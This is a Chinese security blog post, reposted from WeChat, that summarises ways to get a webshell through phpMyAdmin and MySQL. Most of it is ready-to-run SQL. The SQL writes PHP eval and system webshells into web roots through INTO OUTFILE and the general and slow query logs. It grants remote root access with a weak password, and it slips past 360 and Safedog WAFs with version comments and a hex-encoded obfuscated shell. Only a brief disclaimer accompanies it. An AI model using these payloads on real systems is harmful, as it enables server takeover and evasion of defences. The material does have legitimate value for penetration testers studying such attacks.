> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/AYhwvH8Nb2wn-DElN5oi2w)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

**所有话题标签：**

[#Web 安全](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1558250808926912513&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#漏洞复现](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1558250808859803651&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#工具使用](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1556485811410419713&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#权限提升](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559100355605544960&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

[#权限维持](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1554692262662619137&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#防护绕过](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1553424967114014720&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#内网安全](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559102220258885633&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#实战案例](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1553386251775492098&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

[#其他笔记](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559102973052567553&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#资源分享](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559103254909796352&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect) [](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559103254909796352&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect) [#MSF](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1570778197200322561&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

 |

**0x01 前言**

phpMyAdmin 是一个以 PHP 为基础的 MySQL 数据库管理工具，管理者可以通过 Web 方式来控制和操作 MySQL 数据库。phpMyAdmin 在 MySQL 和 MariaDB 上支持多种操作，可以直接在用户界面中执行常用操作，如：浏览 / 删除 / 创建 / 复制 / 删除 / 重命名和更改数据库、表、视图、字段和索引，管理 MySQL 用户帐户和权限等，也可以直接执行 SQL 语句。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7BclPiahDJpN6JD3NMMGnl0ov052qgkw9EiaohibRp5IiczibW9ibcoyBgqIOEg/640?wx_fmt=png)

  

**0x02 Getshell 常见报错**

**(1) #1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement  
**

```
show global variables like "%secure%";      //查询secure_file_priv配置
secure_file_prive=null                      //不允许导入导出数据到目录
secure_file_priv=c:\90sec                   //允许导入导出数据到指定目录
secure_file_priv=""                         //允许导入导出数据到任意目录
secure_file_priv="/"                        //允许导入导出数据到任意目录
```

****注：****在 my.ini、my.cnf、mysqld.cnf 文件中找到 secure_file_prive 并将其值设置为空 ""或斜杠"/"，然后重启 MySQL 服务即可！

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7BcVtARaRic8znfrNuVH4kaEVNHKekNnPlH3icqbdhBjE9oRf4ZL58whq1A/640?wx_fmt=png)

#### **(2) #1045 - Access denied for user 'root'@'localhost' (using password: YES)** 

```
select * from mysql.user;                                //查询所有用户权限
select * from mysql.user where user="root";              //查询root用户权限
update user set File_priv ='Y' where user = 'root';      //允许root用户读写文件
update user set File_priv ='N' where user = 'root';      //禁止root用户读写文件
flush privileges;                                        //刷新MySQL系统权限相关表
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7BcZY0AteZUOlvzRhzBDNdSBf3ibg4o6COU8qfAIeGwYicmzNNS3UL4JTpg/640?wx_fmt=png)

****0x03 Getshell 方式小结****

#### (1) 读取 / 导出中文路径

```
load data infile 'C:\\phpStudy\\WWW\\90sec.php' into table user;
select load_file(concat('C:\\phpStudy\\WWW\\',unhex('b2e2cad4') ,'\\90sec.php'));

set character_set_client='gbk';set character_set_connection='gbk';set character_set_database='gbk';set character_set_results='gbk';set character_set_server='gbk';select '<?php eval($_POST[pass]);?>' into outfile 'C:\\phpStudy\\WWW\\测试\\90sec.php';
```

#### (2) 常规导出 Webshell-1

```
Create TABLE shadow9 (content text NOT NULL);
Insert INTO shadow9 (content) VALUES('<?php @eval($_POST[pass]);?>');
select content from shadow9 into outfile 'C:\\phpStudy\\WWW\\90sec.php';

DROP TABLE IF EXISTS `shadow9`;
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7Bctuu4DtOKP8AhG2R6BzTd372SYmm6BSL1jJXbhEIibpTAfMUhniaZp0JA/640?wx_fmt=png)

#### (3) 常规导出 Webshell-2

```
select '<?php @eval($_POST[pass]);?>' into outfile 'c:/phpstudy/www/90sec.php';  
select '<?php @eval($_POST[pass]);?>' into outfile 'c:\\phpstudy\\www\\90sec.php';
select '<?php @eval($_POST[pass]);?>' into dumpfile 'c:\\phpstudy\\www\\bypass.php';

select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' into outfile 'C:\\phpStudy\\WWW\\90sec.php';
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7BcSvIgAh5HBPR9eGcUItExv6fjD3R49Fibun4E69FcTxO7fwnEj8Y9eQQ/640?wx_fmt=png)  

#### (4) general_log Getshell

```
show global variables like "%genera%";                      //查询general_log配置
set global general_log='on';                                //开启general log模式
SET global general_log_file='C:/phpStudy/WWW/cmd.php';      //设置日志文件保存路径
SELECT '<?php phpinfo();?>';                                //phpinfo()写入日志文件
set global general_log='off';                               //关闭general_log模式
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7BcM5WjwQFjgscSAzTibibdXRCaYDGTFAN75854MPiajsOYXz6o7zq2OLIgQ/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7Bc6ofz77qqlTMHOY10NNI3oeicgiaeqNoWRpMR1IxiabwO46jvKcVAQdn7w/640?wx_fmt=png)

**注：**高版本 MySQL 数据库中一般都默认配置了 secure_file_priv 变量值为 null，限制了文件的导入导出，这时我们可以尝试利用 MySQL 的 general_log 和 slow_query_log 日志文件写入 Webshell。

#### (5) slow_query_log_file Getshell

```
show variables like 'slow_query_log_file';
set global slow_query_log=on;
set global slow_query_log_file="C:\\phpStudy\\WWW\\shell.php";
select sleep(15),'<?php phpinfo();?>';
set global slow_query_log=off;
```

****注：****利用 general_log 或 slow_query_log 在成功写入 Webshel 后建议立即 OFF 关闭，否则可能会因为 php.ini 配置文件中的 memory_limit 参数设定的内存值太小而出现 “内存不足” 的报错。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7Bc6VtUxNTXKQaOD2xdOoRGhhhlq7eJ7MDibx95Y6HV5icjpxySpZ1Ubfmg/640?wx_fmt=png)

Windows 报错：

```
#29 - File 'C:\phpStudy\PHPTutorial\testing\cmd.php' not found (Errcode: 13)
```

Linux 报错：

```
#1231 - Variable 'general_log_file' can't be set to the value of '/home/wwwroot/default/cmd.php'
```

出错原因：

```
MySQL运行用户与网站目录对应用户的写入/修改权限问题，需要给予网站目录所需权限才能解决该问题！
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7Bcz7V1ZsHrjXqvJicyZFNSbqSnr7wCNUdZKvicnlNqJkhYibxEpCuTIkFiaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7BcwohchF0MIHp23u4LR8Ied3qWZAAbFFYfpvA3ibPmCdrz2mwz8vItcyg/640?wx_fmt=png)

#### (6) 绕过 WAF Getshell-1

phpMyAdmin 导出 Webshell 时如果遇到 WAF 可能就会被拦截，因为 WAF 会检测我们提交的 POST、GET 数据包内容中是否含有危险函数、SHELL 特征等，如果有则拦截，没有则放行。

这时我们可以尝试开启外链来执行导出 Webshell 的 SQL 语句，因为这样走的不是 POST、GET 方式，所以这样执行 SQL 语句是不会被 WAF 拦截的。

```
grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;    //开启MySQL外链
flush privileges;                          //刷新MySQL系统权限相关表
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7BcPnaGtzZIRuLNqtKialTtXryR8IvlAaRerXZQyY2Lk01QRctgHJA0gWA/640?wx_fmt=png)

#### (7) 绕过 WAF Getshell-2

检测我们提交 SQL 语句的 POST、GET 数据包中是否包含的有 WAF 特征库中的危险函数、SHELL 特征等，如：select、outfile、eval、assert 等这样的就会被拦截。

```
select '<?php @eval($_POST[pass]);?>' into outfile 'c:/phpstudy/www/90sec.php';
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7Bc9zTma50awxgZorTkmxRiau7oSQuS7jIPUwicqkcpWH0I618r8F3YxxCw/640?wx_fmt=png)

绕过 360 网站卫士：

```
select '<?php @eval($_POST[pass]);?>' into /*!50001outfile*/ 'c:/phpstudy/www/bypass.php';
```

绕过网站安全狗（<4.0）：

```
select 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
```

**注：**Hex 编码，提交时虽然会显示拦截，但其实 [过狗马] 已经被写进去了！

绕过网站安全狗（4.0 正式版）：

```
/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfn3ZxIYNibVSAAuaYWfC7BcbvDC9oOcYqiblb34wqpuTWPjjsDYr3aBXJFicNRz91AqyNTC4ia106pMQ/640?wx_fmt=png)

只需在公众号回复 “9527” 即可领取一套 HTB 靶场学习文档和视频，回复 “1120” 领取黑客防线和安全参考等安全杂志 PDF 电子版，你还在等什么？？？

**【往期 TOP5】**

[绕过 CDN 查找真实 IP 方法总结](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484585&idx=1&sn=28a90949e019f9059cf9b48f4d888b2d&chksm=cfa6a0baf8d129ac29061ecee4f459fa8a13d35e68e4d799d5667b1f87dcc76f5bf1604fe5c5&scene=21#wechat_redirect)

[站库分离常规渗透思路总结](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484281&idx=1&sn=4d9fdae999907b222b0890fccb25bbcc&chksm=cfa6a76af8d12e7c366e0d9c4f256ec6ee6322d900d14732b6499e7df1c13435f14238a19b25&scene=21#wechat_redirect)  

[谷歌浏览器插件 - 渗透测试篇](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484374&idx=1&sn=1bd055173debabded6d15b5730cf7062&chksm=cfa6a7c5f8d12ed31a74c48883ab9dfe240d53a1c0c2251f78485d27728935c3ab5360e973d9&scene=21#wechat_redirect)  

[谷歌浏览器插件推荐 - 日常使用篇](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484349&idx=1&sn=879073cc51e95354df3a36d0ed360b62&chksm=cfa6a7aef8d12eb8874da853904847c8c31ff96de4bab3038ce004c92f3b130c36f24c251cc9&scene=21#wechat_redirect)

[绕过 360 安全卫士提权实战案例](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247484136&idx=1&sn=8ca3a1ccb4bb7840581364622c633395&chksm=cfa6a6fbf8d12fedb0526351f1c585a2556aa0bc2017eda524b136dd4c016e0ab3cdc5a3f342&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOfSyD5Wo2fTiaYRzt5iaWg1GJ6X5g7wBvlRrvCcGXUd61L5Aia8VREQibSXkfcwicxpAEoAUMFGfKhHuiaA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfSyD5Wo2fTiaYRzt5iaWg1GJk2Cx54PBIoc0Ia3z1yIfeyfUV61mn3skB5bGP3QHicHudVjMEGhqH4A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRnK4cg8icPXAOUEccicNrVeu28btPBkFY7VwQzohkcqunVO9dXW5bh4uQ/640?wx_fmt=gif)  如果对你有所帮助，点个分享、赞、在看呗！![](https://mmbiz.qpic.cn/mmbiz_gif/XOPdGZ2MYOeicscsCKx326NxiaGHusgPNRnK4cg8icPXAOUEccicNrVeu28btPBkFY7VwQzohkcqunVO9dXW5bh4uQ/640?wx_fmt=gif)